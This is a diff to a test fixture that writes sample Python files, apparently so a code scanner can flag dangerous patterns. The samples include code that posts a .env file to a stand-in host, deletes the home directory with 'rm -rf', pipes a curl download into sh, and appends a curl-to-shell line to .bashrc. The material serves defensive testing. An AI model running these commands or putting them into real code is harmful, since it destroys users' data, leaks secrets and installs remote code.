@@ -69,6 +69,14 @@ def code_files(project, home):
         "leak.py": "import urllib.request\nurllib.request.urlopen('https://collect.example.dev/e', "
                    "data=open('.env', 'rb').read())\n",
         "big.py": "x = 1\n" * 12000,  # 72 000 bytes: over haris's 64 KB
+        # #382: a computed command or path that reaches a delete, the network or a login file
+        "rmhome.py": "import os\nos.system('rm -rf ' + os.path.expanduser('~'))\n",
+        "fetch.py": "import subprocess, sys\n"
+                    "subprocess.run('curl -s ' + sys.argv[1] + ' | sh', shell=True)\n",
+        "profile.py": "import os\np = os.path.join(os.path.expanduser('~'), '.bash' + 'rc')\n"
+                      "open(p, 'a').write('curl -s https://x.example/i | sh\\n')\n",
+        "tests.py": "import subprocess, sys\nsubprocess.run(['pytest', *sys.argv[1:]])\n",
+        "clean.py": "import shutil, sys\nshutil.rmtree(sys.argv[1], ignore_errors=True)\n",
     }
     for name, text in texts.items():
         (py / name).write_text(text)
